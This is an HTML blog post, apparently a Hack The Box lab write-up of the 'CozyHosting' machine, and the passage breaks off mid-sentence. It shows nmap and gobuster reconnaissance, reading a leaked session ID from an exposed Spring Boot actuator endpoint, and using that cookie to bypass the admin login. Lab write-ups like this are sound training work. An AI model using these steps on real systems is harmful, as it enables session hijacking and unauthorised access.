@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — CozyHosting&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — CozyHosting">
+  
+    <meta name="description" content="CozyHosting is pretty straightforward. It starts with stealing a session cookie from a misconfigured Sprint Boot server. With this, I can access an admin panel and find an endpoint that’s vulnerable to OS command injection. For root, it’s simply a GTFOBins exploit.">
+    <meta property="og:description" content="CozyHosting is pretty straightforward. It starts with stealing a session cookie from a misconfigured Sprint Boot server. With this, I can access an admin panel and find an endpoint that’s vulnerable to OS command injection. For root, it’s simply a GTFOBins exploit.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — CozyHosting</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, May 7, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/291a32c4135544518b42b3dce484d87b" class="PageRoot"><h3 id="https://www.notion.so/2ae32eaf68864a8e90111389d1d55b8b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ae32eaf68864a8e90111389d1d55b8b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/27f567df1c22440fb956396a7e8a89a7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">CozyHosting is pretty straightforward. It starts with stealing a session cookie from a misconfigured Sprint Boot server. With this, I can access an admin panel and find an endpoint that’s vulnerable to OS command injection. For root, it’s simply a GTFOBins exploit.</span></span></p></div><div id="https://www.notion.so/91ac435eac114a01924f8d60272ee69b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ff1fa5c2c134e2f86500215a39d7a3a" class="Divider"></div><h3 id="https://www.notion.so/0d0029f330fe442c8b398c706a58c812" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0d0029f330fe442c8b398c706a58c812"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/156d995f226d48a5ace9d75f7c177548" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/e4ece0c04e93489eb0967465ced81f5c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.98.33
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 23:07 ACDT
+Nmap scan report for 10.129.98.33
+Host is up (0.33s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 69.59 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,80 10.129.98.33
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 23:10 ACDT
+Nmap scan report for 10.129.98.33
+Host is up (0.33s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 5.0 (99%), Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   332.78 ms 10.10.14.1
+2   332.59 ms 10.129.98.33
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds</span></span></span></code></pre><div id="https://www.notion.so/9dc2cf6f94824d1891f8d4ce894b1617" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found SSH and HTTP open. A host name is also identified, and I’ll add it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/477ba49198dc4497b9e75a71cd33493b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine CozyHosting</span>
+<span class="token number">10.129</span>.98.33    cozyhosting.htb</span></span></span></code></pre><div id="https://www.notion.so/b86b3315148c4a3db1d19abd3715a5ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2c9b2fecc2d94889952feba74d800dc1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/5c6fda88fbd845b58540af03768d031e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The site seems to be a hosting and monitoring service</span></span></p></div><div id="https://www.notion.so/5ee9b3bb14854b8a959b8dcf1b50f50d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1b1c378f-5c18-474a-a7c9-c5029331ecfb%2FUntitled.png?width=1903&amp;table=block&amp;id=5ee9b3bb-1485-4b8a-959b-8dcf1b50f50d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1b1c378f-5c18-474a-a7c9-c5029331ecfb%2FUntitled.png?width=1903&amp;table=block&amp;id=5ee9b3bb-1485-4b8a-959b-8dcf1b50f50d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/749d2cb26607493ea52d5fc053e6df7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Most of the buttons and links on the page are fake, except “Login”, which redirected to a login page.</span></span></p></div><div id="https://www.notion.so/69cba43dd209421ea8a3924c68aed6e8" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe1c1e0ae-c7cf-4eda-8402-9380016de3de%2FUntitled.png?width=637&amp;table=block&amp;id=69cba43d-d209-421e-a8a3-924c68aed6e8"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe1c1e0ae-c7cf-4eda-8402-9380016de3de%2FUntitled.png?width=637&amp;table=block&amp;id=69cba43d-d209-421e-a8a3-924c68aed6e8" style="width:637px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/652af967ba7b4c7da798d3bbd0971589" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried a few default credentials, as well as some SQL injection payloads, but none of them worked. With nothing much in hand, I’ll run GoBuster to check for hidden endpoints.</span></span></p></div><pre id="https://www.notion.so/080c8d38722e4894b0085a465d95ae29" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cozyhosting.htb
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/login                (Status: 200) [Size: 4431]
+/index                (Status: 200) [Size: 12706]
+/admin                (Status: 401) [Size: 97]
+/logout               (Status: 204) [Size: 0]
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>/error                (Status: 500) [Size: 73]</span></mark></span><span class="SemanticString"><span>
+/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/e2166aca785a45ffa30549e1741ecdc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Despite a 401 status for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/admin</code></span><span class="SemanticString">, it actually redirects back to the login page. Also, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/error</code></span><span class="SemanticString"> interestingly throws a 500 status.</span></span></p></div><div id="https://www.notion.so/828ff265ffe440e396083c5ac93e3d6b" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2293cfe5-08ae-4e27-9c9d-f169e29c88ed%2FUntitled.png?width=760&amp;table=block&amp;id=828ff265-ffe4-40e3-9608-3c5ac93e3d6b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2293cfe5-08ae-4e27-9c9d-f169e29c88ed%2FUntitled.png?width=760&amp;table=block&amp;id=828ff265-ffe4-40e3-9608-3c5ac93e3d6b" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e233e7b9e6fa4fc28a3cb9c7f2b17ba1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking the endpoint, it simply displayed “Whitelabel Error Page” with some vague error messages. A quick Googling would reveal that this error page is associated with Java Spring Boot.</span></span></p></div><div id="https://www.notion.so/77821b3f0166422487852d0a62a337c1" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb0bcbbc5-c26c-4edb-b459-8352b71ce44a%2FUntitled.png?width=1482&amp;table=block&amp;id=77821b3f-0166-4224-8785-2d0a62a337c1"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb0bcbbc5-c26c-4edb-b459-8352b71ce44a%2FUntitled.png?width=1482&amp;table=block&amp;id=77821b3f-0166-4224-8785-2d0a62a337c1" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/44e311da994b4d3681e26454cdc275c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/cd8db9375c1049ffa270549e05f49fd9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Authentication Bypass:</strong></span></span></p></div><div id="https://www.notion.so/c920549dc0e64a6d939505c18d6012a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now that I know it’s a Spring Boot application, I’ll run GoBuster again with a Spring-specific wordlist:</span></span></p></div><pre id="https://www.notion.so/cc618628f74e40dd88b36f42cf6ffec1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cozyhosting.htb
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/actuator/env/lang    (Status: 200) [Size: 487]
+/actuator             (Status: 200) [Size: 634]
+/actuator/env/path    (Status: 200) [Size: 487]
+/actuator/health      (Status: 200) [Size: 15]
+/actuator/env/home    (Status: 200) [Size: 487]
+/actuator/sessions    (Status: 200) [Size: 48]
+/actuator/env         (Status: 200) [Size: 4957]
+/actuator/mappings    (Status: 200) [Size: 9938]
+/actuator/beans       (Status: 200) [Size: 127224]
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/d45c3512537d4e39a4355f066acff284" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">These endpoints relate to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html">Spring Actuators</a></span><span class="SemanticString">, which is a Spring Boot feature for managing and monitoring the web application. They often contain sensitive configuration data and credentials, and the server is misconfigured to allow unauthenticated access to them. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">This post</a></span><span class="SemanticString"> also documented an RCE attack on Actuators, but it seems to be not possible here, since the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/jolokia</code></span><span class="SemanticString"> endpoint is not found.</span></span></p></div><pre id="https://www.notion.so/040542aec5434b32b771d35b269b5f02" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://cozyhosting.htb/jolokia
+
+{&quot;timestamp&quot;:&quot;2024-02-22T13:24:12.895+00:00&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;path&quot;:&quot;/jolokia&quot;}
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://cozyhosting.htb/jolokia/list
+
+{&quot;timestamp&quot;:&quot;2024-02-22T13:24:22.372+00:00&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;path&quot;:&quot;/jolokia/list&quot;}</span></span></span></code></pre><div id="https://www.notion.so/dcda77b178d5462888914309b970a23e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/actuator/sessions</code></span><span class="SemanticString"> seems to contain a token for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">kanderson</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/202ebe5c31974971b287da006660bde6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cozyhosting]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://cozyhosting.htb/actuator/sessions
+
+{&quot;C82A15FB1F2D39ABCAC089FB57C44387&quot;:&quot;kanderson&quot;}</span></span></span></code></pre><div id="https://www.notion.so/df48bb46fcfe44f887d07fc0c8eeb36e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the endpoint, I’m guessing it’s the session token for the web app. I’ll replace the value of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSESSIONID</code></span><span class="SemanticString"> in my browser.</span></span></p></div><div id="https://www.notion.so/1245cd3d00044c0fa509450b15d0f5b4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When I reload the page, it redirects me to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/admin</code></span><span class="SemanticString">, bypassing the login:</span></span></p></div><div id="https://www.notion.so/26be880549234f51b994e88ea1112d95" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F74ccd6a6-4b6d-4750-bbbd-cc668a0da6d5%2FUntitled.png?width=1909&amp;table=block&amp;id=26be8805-4923-4f51-b994-e88ea1112d95"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F74ccd6a6-4b6d-4750-bbbd-cc668a0da6d5%2FUntitled.png?width=1909&amp;table=block&amp;id=26be8805-4923-4f51-b994-e88ea1112d95" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d7a3de8fd44946bd9dc28f771316712a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3c7ff3fbab1348eba8348d49113980e3" class="Divider"></div><h3 id="https://www.notion.so/e49d62858dce4fa8a50db04bb987d2cf" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/e49d62858dce4fa8a50db04bb987d2cf"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/3a6157918dec48b3b5f6e087fb4bab58" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin Page:</strong></span></span></p></div><div id="https://www.notion.so/7e35fed5564645b4a43b765d4f6a51f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On the admin page, there’s an option to add hosts for automatic patching, and it seems to be connecting via SSH:</span></span></p></div><div id="https://www.notion.so/a58128e600c749d7a19bac061afdb9be" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5ca3026b-1468-4393-85bb-d15f03696fbd%2FUntitled.png?width=1244&amp;table=block&amp;id=a58128e6-00c7-49d7-a19b-ac061afdb9be"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5ca3026b-1468-4393-85bb-d15f03696fbd%2FUntitled.png?width=1244&amp;table=block&amp;id=a58128e6-00c7-49d7-a19b-ac061afdb9be" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1b7fb21f390344248ddbe0cb13d2bbc1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried adding the server itself, and provided </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">kanderson</code></span><span class="SemanticString"> as the username:</span></span></p></div><div id="https://www.notion.so/ecd8b873a0254cbab314b97c8e0a9e82" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F115fab7f-21c6-4048-8ac8-be4c508b2778%2FUntitled.png?width=685&amp;table=block&amp;id=ecd8b873-a025-4cba-b314-b97c8e0a9e82"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F115fab7f-21c6-4048-8ac8-be4c508b2778%2FUntitled.png?width=685&amp;table=block&amp;id=ecd8b873-a025-4cba-b314-b97c8e0a9e82" style="width:685px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9281ff9d384048ddadadab684cf3b9a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But it failed.</span></span></p></div><div id="https://www.notion.so/f435180781204437b394291ea6efe263" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2554e0c8-bdf6-4db3-8a83-fb625246300c%2FUntitled.png?width=596&amp;table=block&amp;id=f4351807-8120-4437-b394-291ea6efe263"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2554e0c8-bdf6-4db3-8a83-fb625246300c%2FUntitled.png?width=596&amp;table=block&amp;id=f4351807-8120-4437-b394-291ea6efe263" style="width:596px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c74313a286d547969f883d1dc45e9ef8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking the request history in Burp, 